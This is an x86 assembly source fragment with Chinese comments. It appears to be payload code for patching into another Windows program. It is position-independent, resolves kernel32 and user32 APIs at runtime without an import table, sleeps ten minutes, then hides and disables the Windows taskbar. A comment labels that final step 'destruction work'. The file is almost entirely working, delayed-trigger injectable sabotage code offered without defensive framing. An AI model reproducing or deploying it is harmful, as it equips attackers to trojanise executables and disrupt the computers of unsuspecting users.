;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
;补丁功能代码需要的DLL，函数名，字符串等全局变量定义
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
REMOTE_CODE_START	equ this byte

_lpGetProcAddress	dd	0
_lpLoadLibraryA		dd	0
_lpGetModuleHandleA	dd	0

_szCaption	db	'恭喜',0
_szText		db	'非导入表调用成功!',0

;需要用到的模块名
__szHmoduleName	equ this byte
_szKernel32	db	'kernel32.dll',0
_szUser32	db	'user32.dll',0
		dd	0	;以一个0结束

;需要用到的模块基址
__lpHmodule	equ this byte
_hKernel32	dd	0
_hUser32		dd	0
		dd	0

;模块对应的函数名
__szFuncName	equ this byte
;kernel32
_szGetTickCount		db 'GetTickCount',0
_szSleep		db 'Sleep',0
			dd 0   ;一个链接库函数的结束
;user32
_szFindWindowA	        db 'FindWindowA',0
_szShowWindow	        db 'ShowWindow',0
_szEnableWindow	        db 'EnableWindow',0
		        dd 0
		  
;函数地址列表	
__lpFuncAddress	equ this byte
;kernel32
_lpGetTickCount		dd	0
_lpSleep		dd	0
;user32
_lpFindWindowA		dd	0
_lpShowWindow		dd 	0
_lpEnableWindow		dd	0
			dd	0 


szClassName		db	'Shell_TrayWnd',0

__GetAllDll	proc
	pushad

	call	@F
	@@:
	pop	ebx
	sub	ebx,@B
	lea	esi,dword ptr [ebx+offset __szHmoduleName]	;DLL名列表
	lea	edi,dword ptr [ebx+offset __lpHmodule]		;DLL基址列表
	_GetNextDll:
	mov	eax,dword ptr [esi]
	cmp	eax,0
	je	_FindAllDll
	push	esi
	call	dword ptr [ebx+offset _lpGetModuleHandleA]
	cmp	eax,0
	jne	_ok
	push	esi
	call	dword ptr [ebx+offset _lpLoadLibraryA]
	_ok:
	mov	dword ptr [edi],eax ;DLL句柄
	add	edi,4
	xchg	edi,esi
	mov	ecx,0ffffffffh
	xor	eax,eax
	repne	scasb
	xchg	edi,esi
	jmp	_GetNextDll
	_FindAllDll:

	popad
	xor	eax,eax
	ret
__GetAllDll	endp

__GetAllApi	proc
	
	pushad
	
	call	@F
	@@:
	pop	ebx
	sub	ebx,@B
	lea	edx,dword ptr [ebx+offset __lpHmodule]		;DLL基址列表
	lea	esi,dword ptr [ebx+offset __szFuncName]		;函数名列表
	lea	edi,dword ptr [ebx+offset __lpFuncAddress]	;函数地址列表
	_GetNextDll:
	mov	ecx,[edx]
	cmp	ecx,0
	je	_FindAllDll
	_GetNextFunc:
		mov	eax,dword ptr [esi]
		cmp	eax,0     ;获得结束
		je	_FindAllFunc
		push	edx
		push	esi
		push	dword ptr [edx]
		call	dword ptr [ebx+offset _lpGetProcAddress]
		mov	dword ptr [edi],eax
		pop	edx

		mov	ecx,0ffffffffh
		xor	eax,eax
		xchg	esi,edi
		repne	scasb
		xchg	esi,edi
		add	edi,4
		jmp	_GetNextFunc
	_FindAllFunc:
	add	esi,4
	add	edx,4
	jmp	_GetNextDll
	_FindAllDll:
	popad
	xor	eax,eax
	ret
__GetAllApi	endp

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
_destroy	proc	uses ebx edi esi lParam
		local	@hModule,@dwStartTick
		local	@hwnd

		call	@F
		@@:
		pop	ebx
		sub	ebx,@B
		call	__GetAllDll
		call	__GetAllApi
		call	dword ptr [ebx+offset _lpGetTickCount]
		mov	@dwStartTick,eax
		.while	TRUE
			push	600000	;延迟10分钟后进行破坏工作@_@
			call	dword ptr [ebx+offset _lpSleep]
			call	dword ptr [ebx+offset _lpGetTickCount]
			sub	eax,@dwStartTick
			cmp	eax,600000
			jg	_ruin
		.endw
		_ruin:
		push	0
		lea	eax,[ebx+offset szClassName]
		push	eax
		call	dword ptr [ebx+offset _lpFindWindowA]
		mov	@hwnd,eax
		push	SW_HIDE
		push	eax
		call	dword ptr [ebx+offset _lpShowWindow]
		push	0
		push	@hwnd
		call	dword ptr [ebx+offset _lpEnableWindow]
		ret

_destroy	endp

REMOTE_CODE_END		equ this byte
REMOTE_CODE_LENGTH	equ offset REMOTE_CODE_END - offset REMOTE_CODE_START
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>